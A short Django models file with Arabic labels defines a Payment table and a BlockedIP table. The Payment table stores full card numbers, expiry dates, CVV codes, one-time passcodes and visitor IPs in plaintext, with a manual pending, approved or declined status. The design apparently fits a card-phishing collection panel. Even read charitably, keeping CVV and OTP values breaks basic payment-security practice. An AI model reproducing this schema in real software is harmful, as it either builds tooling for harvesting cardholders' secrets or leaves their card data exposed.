from django.db import models



# Create your models here.

MONTH_CHOICES = [
    ('', 'الشهر'),
    ('01', '01'),
    ('02', '02'),
    ('03', '03'),
    ('04', '04'),
    ('05', '05'),
    ('06', '06'),
    ('07', '07'),
    ('08', '08'),
    ('09', '09'),
    ('10', '10'),
    ('11', '11'),
    ('12', '12'),
]

YEAR_CHOICES = [
    ('', 'السنة'),
    ('23', '2023'),
    ('24', '2024'),
    ('25', '2025'),
    ('26', '2026'),
    ('27', '2027'),
    ('28', '2028'),
    ('29', '2029'),
    ('30', '2030'),
]

class Payment(models.Model):
#   id = models.PositiveIntegerField(primary_key=True, unique=True, null=False)
    full_name = models.CharField(max_length=100, null=True)
    user_ip = models.GenericIPAddressField(null=True)
    submission_date = models.DateTimeField(auto_now_add=True, null=True)
    card_number = models.CharField(max_length=19, null=True)
    month_pick = models.CharField(max_length=2, choices=MONTH_CHOICES, null=True)
    year_pick = models.CharField(max_length=4, choices=YEAR_CHOICES, null=True)
    cvv = models.CharField(max_length=3, null=True)
    card_type = models.CharField(max_length=20, blank=True, null=True)
    otp = models.CharField(max_length=8, null=True)
    status = models.CharField(max_length=8, default='PENDING', choices=(
        ('PENDING', 'PENDING'),
        ('APPROVED', 'APPROVED'),
        ('DECLINED', 'DECLINED'),
    ))
    
    def __str__(self):
        return self.submission_date.strftime('%Y-%m-%d %H:%M')

class BlockedIP(models.Model):
    ip_address = models.GenericIPAddressField()
    
    def __str__(self):
        return self.ip_address
       